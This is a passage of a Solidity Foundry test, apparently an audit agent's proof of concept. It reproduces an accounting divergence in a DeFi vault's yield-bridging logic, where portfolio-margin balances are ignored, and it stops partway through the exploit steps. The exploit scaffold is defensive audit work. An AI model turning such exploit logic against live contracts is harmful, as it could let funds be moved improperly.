// ATTACK TIMELINE:
// 1. [Setup] Inherit ToL1WeiHarness which deploys the full protocol and sets up base state.
// 2. [T=0] Governor enables PM (Portfolio Margin) mode via setPmEnabled(true).
// 3. [T=1] Mock L1 USDC balance to max to ensure L1-side capacity check (_sendL1Bridge) passes.
// 4. [T=2] User deposits 100,000 USDC, establishing baseline principal.
// 5. [T=3] Warp time and bridge principal to L1 to simulate normal operations.
// 6. [T=4] Prime distributable surplus (10,000 USDC) to create yield.
// 7. [T=5] Calculate yieldShortfall() on EVM side. Due to the bug, this ignores PM-supplied balances.
// 8. [T=6] Operator calls bridgeYieldFromL1(shortfall). L1-side _sendL1Bridge includes PM balance, allowing the bridge.
// 9. [Assert] Verify that outstandingL1Principal decreased (yield bridged) and the divergence occurred.

contract AuditAgentPoC is Test, ToL1WeiHarness {
    function test_exploit() public {
        // Step 2: Enable PM mode to trigger the divergence
        vm.prank(governor);
        vault.setPmEnabled(true);

        // Step 3: Mock L1 spot USDC balance to max
        _mockVaultL1SpotUsdc(type(uint64).max);

        // Step 4: User deposits 100,000 USDC
        _depositAs(user1, 100_000e6);

        // Step 5: Warp time and bridge principal
        vm.warp(block.timestamp + 6 hours);
        vm.prank(operator);
        vault.keeperBridge(MonetrixVault.BridgeTarget.Vault);

        // Step 6: Prime distributable yield
